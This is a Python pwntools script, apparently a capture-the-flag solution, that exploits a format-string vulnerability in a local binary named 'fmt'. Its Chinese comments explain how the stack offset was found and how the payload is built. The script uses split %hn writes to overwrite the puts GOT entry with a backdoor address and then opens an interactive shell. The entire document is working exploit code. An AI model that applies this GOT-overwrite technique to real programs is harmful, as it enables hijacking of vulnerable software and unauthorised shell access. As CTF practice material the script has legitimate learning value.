from pwn import *

r = process(r'./fmt')
elf = ELF(r'./fmt')
context.log_level = 'debug'
context.arch = 'amd64'

r.sendlineafter(b'name: ', b'test')

# payload = b'A' * 4 + b'%6$p'
# r.sendlineafter(b'beleve you', payload)
# r.recvline()
# print(r.recvline())  # b'AAAA0x7024362541414141\n'
# 经过调试在第六个位置输出了0x41414141，即AAAA的值，说明printf泄漏的地址会从第七个位置开始泄漏
offset = 7

# 尝试修改puts@got表为syetem@plt
puts_got = elf.got['puts']
backdoor_addr = 0x004011D6
# 计算需要写入的值（分高低两部分，因为x64一次写入最多4字节）
# shell_addr = 0x004011D6
high = (backdoor_addr >> 16) & 0xffff  # 高16位: 0x0040
low = backdoor_addr & 0xffff  # 低16位: 0x11D6

# 64位的fmt下，使用fmtstr_payload()会出现截断问题导致失败
# payload = fmtstr_payload(7, {puts_got: backdoor_addr})

print(f"puts_got: {hex(puts_got)}\nshell_addr: {hex(backdoor_addr)}")
# puts_got: 0x00404018
# shell_addr: 0x004011D6
# 观察两者地址，只相差后两位4018、11d6，所以只修改\x18和\x40即可
# 使用$hn来一次填充4个字节
payload = f'%{high}c%10$hn%{str(low - high)}c%11$hn'
payload = payload.ljust(24, 'A')  # 新偏移: 7 + 24/8 = 10
payload = payload.encode('utf-8')
payload += p64(puts_got + 2) + p64(puts_got)
r.sendlineafter(b'beleve you', payload)
r.interactive()
